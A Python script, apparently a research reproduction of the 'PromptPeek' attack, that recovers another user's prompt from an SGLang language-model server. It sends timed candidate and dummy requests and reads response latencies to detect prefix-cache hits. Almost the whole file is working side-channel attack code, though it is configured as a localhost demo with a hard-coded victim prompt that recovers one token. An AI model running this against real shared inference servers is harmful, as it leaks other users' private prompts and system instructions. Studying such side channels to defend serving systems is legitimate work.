import asyncio
import json
import logging
import sys
from typing import List, Tuple
from urllib.parse import quote

import httpx
import requests

# Import candidate generation functions
from ..candidate.base import get_top_k_candidates, get_bottom_k_dummies

SGLANG_SERVER = "http://localhost:30000"
CANDIDATES_SIZE = 256
DUMMIES_SIZE = 16
MAX_TOKENS = 128
TEMPERATURE = 0

HTTPX_MAX_CONNECTIONS = int((DUMMIES_SIZE * 2 + CANDIDATES_SIZE) * 1.5)

client = httpx.AsyncClient(timeout=600, limits=httpx.Limits(max_connections=HTTPX_MAX_CONNECTIONS))


def gen_next_tokens(prefix: str) -> Tuple[List[str], List[str]]:
    """Generate candidate and dummy tokens using llama-cpp"""
    candidates = get_top_k_candidates(prefix, k=CANDIDATES_SIZE)
    dummies = get_bottom_k_dummies(prefix, k=DUMMIES_SIZE)
    
    # Top-K, Bottom-K tokens
    return (candidates, dummies)


async def send_request(prompt: str, req_id: str, delay: float = 0):
    # Add delay before sending request for timing attack
    if delay > 0:
        await asyncio.sleep(delay)

    return await client.post(
        f"{SGLANG_SERVER}/generate",
        json={
            "text": prompt,
            "rid": req_id,
            "sampling_params": {
                "temperature": TEMPERATURE,
                "max_new_tokens": MAX_TOKENS,
            },
        },
        headers={
            "PromptPeek-Request-Id": req_id,
            "PromptPeek-Prompt": quote(prompt, safe=''),
            "PromptPeek-Delay": str(delay),
        },
    )


async def peek_one(prefix: str):
    cand_toks, dummy_toks = gen_next_tokens(prefix)
    # Use different dummy tokens to avoid excessive cache effects
    # Don't use the same dummy token for all requests

    tasks = []
    # Send pre-dummies first to establish baseline
    for i in range(DUMMIES_SIZE):
        text = prefix + dummy_toks[i] * 2
        id = f"pre_dummy_{i}"
        tasks.append(asyncio.create_task(send_request(text, id)))
    
    # Wait longer to ensure victim's cache is loaded
    await asyncio.sleep(0.5)

    # Send high-priority candidates first (top tokens with higher probability)
    # Split candidates into priority groups
    high_priority_count = min(20, CANDIDATES_SIZE // 4)
    
    for i in range(high_priority_count):
        text = prefix + cand_toks[i] * 2
        id = f"candidate_{i}"
        # Add small delay to spread out requests
        tasks.append(asyncio.create_task(send_request(text, id, delay=i * 0.001)))
    
    await asyncio.sleep(0.1)
    
    # Send remaining candidates
    for i in range(high_priority_count, CANDIDATES_SIZE):
        text = prefix + cand_toks[i] * 2
        id = f"candidate_{i}"
        tasks.append(asyncio.create_task(send_request(text, id, delay=(i - high_priority_count) * 0.0005)))
    
    await asyncio.sleep(0.3)

    # Send post-dummies
    for i in range(DUMMIES_SIZE):
        text = prefix + dummy_toks[i] * 2
        id = f"post_dummy_{i}"
        tasks.append(asyncio.create_task(send_request(text, id)))

    response_order = []
    for task in asyncio.as_completed(tasks):
        res = await task
        body = res.json()

        e2e_latency = body["meta_info"]["e2e_latency"]
        # completion = body["text"]

        req_id = res.request.headers["PromptPeek-Request-Id"]
        prompt = res.request.headers["PromptPeek-Prompt"]
        # delay = res.request.headers["PromptPeek-Delay"]

        response_order.append(
            {"id": req_id, "prompt": prompt, "e2e_latency": e2e_latency}
        )
    return response_order


async def main():
    # victim_input = input("Enter victim's prompt: \n")
    # known_prefix = input("Enter known prefix: \n")
    victim_input = "Imagine you are a business manager who specializes in Organizational Strategy and Crisis Management. You have over 20 years of experience in Silicon Valley, leading diverse teams through rapid scaling and economic downturns."
    known_prefix = "Imagine you are a"  # Remove trailing space

    # Flush Cache
    requests.post(SGLANG_SERVER + "/flush_cache")

    # Victim - send and wait for it to be processed
    print(f"[*] Sending victim request: {victim_input[:50]}...")
    await send_request(victim_input, "victim_0")
    
    # Wait for victim request to be fully processed and cached
    await asyncio.sleep(1.0)

    # TODO: Do proper PromptPeek loop
    recovered = ""
    print(f"[*] Starting attack with known prefix: '{known_prefix}'")
    
    while True:
        current_prefix = known_prefix + recovered
        print(f"\n[*] Current prefix: '{current_prefix}'")
        
        response_order = await peek_one(current_prefix)
        print("\n=== Response Order (by completion time) ===")
        for i, res in enumerate(response_order, 1):
            from urllib.parse import unquote
            req_id = res["id"]
            prompt = unquote(res["prompt"])  # URL decode
            latency = res["e2e_latency"]
            
            # Extract just the token part for readability
            token_part = prompt[len(current_prefix):] if prompt.startswith(current_prefix[:10]) else prompt
            print(f"{i:2d}. [{req_id:20s}] latency: {latency:.3f}s | token: {repr(token_part[:50])}")
        
        # Analyze which candidates came first
        print("\n=== Candidate Analysis ===")
        candidate_positions = [(i, res) for i, res in enumerate(response_order, 1) if "candidate" in res["id"]]
        if candidate_positions:
            # Get top 10 earliest candidates
            top_candidates = candidate_positions[:10]
            print(f"Top 10 earliest candidates (cache hits):")
            for pos, (i, res) in enumerate(top_candidates, 1):
                from urllib.parse import unquote
                prompt = unquote(res["prompt"])
                # Extract the repeated token (format is "prefix token token")
                token_part = prompt[len(current_prefix):].strip()
                if token_part:
                    # Split by space and take first word (the token itself)
                    token = token_part.split()[0] if ' ' in token_part else token_part
                else:
                    token = "<empty>"
                candidate_id = res["id"]
                # Extract candidate number
                cand_num = candidate_id.replace("candidate_", "")
                print(f"  {pos}. Position {i:3d}: candidate_{cand_num:3s} (latency: {res['e2e_latency']:.3f}s) - token: {repr(token)}")
            
            first_candidate_pos, first_candidate = candidate_positions[0]
            from urllib.parse import unquote
            first_prompt = unquote(first_candidate["prompt"])
            token_part = first_prompt[len(current_prefix):].strip()
            next_token = token_part.split()[0] if ' ' in token_part and token_part else token_part
            
            print(f"\n[+] First arriving candidate suggests next token: {repr(next_token)}")
            print(f"[!] Expected token (from victim): 'business'")
            
            # Check if 'business' is in top candidates
            business_found = False
            for pos, (i, res) in enumerate(candidate_positions, 1):
                from urllib.parse import unquote
                prompt = unquote(res["prompt"])
                if 'business' in prompt[len(current_prefix):]:
                    print(f"[!] 'business' found at position {i} (candidate rank: {pos})")
                    business_found = True
                    break
            
            if not business_found:
                print(f"[!] 'business' token not found in response order (may be outside candidate range)")
            
            recovered += " " + next_token
            print(f"[+] Recovered so far: '{known_prefix + recovered}'")
            
            # For demo, only recover one token
            break
        else:
            print("[!] No candidates found in response order")
            break
        break


if __name__ == "__main__":
    asyncio.run(main())
